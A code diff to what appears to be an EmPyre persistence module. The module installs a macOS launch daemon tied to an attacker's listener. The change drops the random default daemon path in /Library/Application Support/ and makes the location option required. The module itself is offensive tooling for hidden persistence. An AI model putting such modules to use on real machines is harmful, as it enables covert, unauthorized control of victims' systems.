@@ -1,5 +1,4 @@
 import base64
-import uuid
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -62,8 +61,8 @@ class Module:
                 'Value'         :   'com.proxy.initialize'
             },
             'DaemonLocation' : {
-                'Description'   :   'The full path of where the EmPyre launch daemon should be located. The default location is /Libary/Application Support/ and a random filename.',
-                'Required'      :   False,
+                'Description'   :   'The full path of where the EmPyre launch daemon should be located.',
+                'Required'      :   True,
                 'Value'         :   ''
             }
         }
@@ -86,11 +85,7 @@ class Module:
     def generate(self):
 
         daemonName = self.options['DaemonName']['Value']
-        if self.options['DaemonLocation']['Value'] != '':
-            programname = self.options['DaemonLocation']['Value']
-        else:
-            programname = "/Library/Application Support/" + str(uuid.uuid4()) + "/" + str(uuid.uuid4())
-
+        programname = self.options['DaemonLocation']['Value']
         plistfilename = "%s.plist" % daemonName
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
